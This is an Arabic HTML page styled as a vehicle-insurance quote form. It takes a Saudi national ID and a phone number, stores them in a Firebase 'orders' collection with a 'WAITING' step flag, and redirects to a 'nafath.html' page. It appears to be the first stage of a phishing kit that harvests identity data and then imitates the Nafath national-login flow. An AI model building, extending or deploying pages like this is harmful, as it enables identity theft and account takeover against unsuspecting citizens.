<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأمين المركبات | البداية</title>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    
    <style>
        body { font-family: sans-serif; background: #f4f7f6; display: flex; justify-content: center; padding: 20px; }
        .form-container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; text-align: center; font-size: 18px; }
        button { width: 100%; padding: 15px; background: #007bff; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 18px; }
        button:hover { background: #0056b3; }
        .error-msg { color: red; font-size: 14px; display: none; margin-bottom: 10px; }
    </style>
</head>
<body>

<div class="form-container">
    <h2 style="text-align: center;">إصدار وثيقة تأمين</h2>
    
    <label>رقم الهوية / الإقامة</label>
    <input type="tel" id="id_number" placeholder="1XXXXXXXXX" maxlength="10" 
           oninput="this.value = this.value.replace(/[^0-9]/g, '')">
    
    <label>رقم الجوال</label>
    <input type="tel" id="phone_number" placeholder="05XXXXXXXX" maxlength="10" 
           oninput="this.value = this.value.replace(/[^0-9]/g, '')">
    
    <div id="error-box" class="error-msg"></div>
    
    <button onclick="handleSecureOrder()">أمن الحين</button>
</div>

<script>
    // --- 1. إعدادات Firebase الخاصة بك ---
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // --- 2. وظيفة تحويل الأرقام العربية إلى إنجليزية ---
    function toEnglish(str) {
        return str.replace(/[٠-٩]/g, d => d.charCodeAt(0) - 1632);
    }

    // --- 3. وظيفة الإرسال الذكية ---
    async function handleSecureOrder() {
        const errBox = document.getElementById('error-box');
        errBox.style.display = "none";

        // جلب البيانات وتحويلها فوراً لأرقام إنجليزية
        let idVal = toEnglish(document.getElementById('id_number').value.trim());
        let phoneVal = toEnglish(document.getElementById('phone_number').value.trim());

        // --- اختبار الذكاء رقم 1 (الهوية) ---
        if (idVal.length !== 10 || (idVal[0] !== '1' && idVal[0] !== '2')) {
            errBox.innerText = "❌ رقم الهوية غير صحيح (يجب 10 أرقام ويبدأ بـ 1 أو 2)";
            errBox.style.display = "block";
            return;
        }

        // --- اختبار الذكاء رقم 2 (الجوال) ---
        if (phoneVal.length !== 10 || !phoneVal.startsWith('05')) {
            errBox.innerText = "❌ رقم الجوال غير صحيح (يجب 10 أرقام ويبدأ بـ 05)";
            errBox.style.display = "block";
            return;
        }

        // --- 4. إرسال البيانات إذا نجح الفحص ---
        try {
            const docRef = await db.collection("orders").add({
                id_number: idVal,
                phone: phoneVal,
                status: "طلب جديد",
                next_step: "WAITING",
                timestamp: firebase.firestore.FieldValue.serverTimestamp()
            });

            // حفظ الـ ID للانتقال لصفحة نفاذ
            localStorage.setItem('user_id', docRef.id);
            window.location.href = "nafath.html";

        } catch (error) {
            alert("حدث خطأ، يرجى التحقق من اتصالك");
        }
    }
</script>

</body>
</html>
